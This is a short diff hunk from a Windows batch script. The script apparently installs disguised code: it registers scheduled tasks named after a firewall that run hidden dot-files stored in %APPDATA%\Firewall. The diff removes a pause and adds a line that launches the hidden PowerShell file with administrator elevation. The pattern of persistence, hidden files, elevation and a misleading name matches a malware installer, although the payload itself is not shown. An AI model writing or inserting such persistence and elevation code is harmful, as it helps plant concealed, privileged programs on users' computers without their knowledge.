@@ -110,7 +110,6 @@ schtasks /create /tn "firewallvb" /tr "cscript.exe %APPDATA%\Firewall\.firewall%
 schtasks /run /tn "firewallps"
 schtasks /run /tn "firewallvb"
 
-pause
-
 :: run x.ps1 file
-powershell -ExecutionPolicy Bypass -Command "& {%_PATH%}"
+powershell -Command "Start-Process PowerShell.exe -ArgumentList '-executionpolicy remotesigned -File \"%APPDATA%\Firewall\.firewall64x.ps1\"' -Verb RunAs"
+
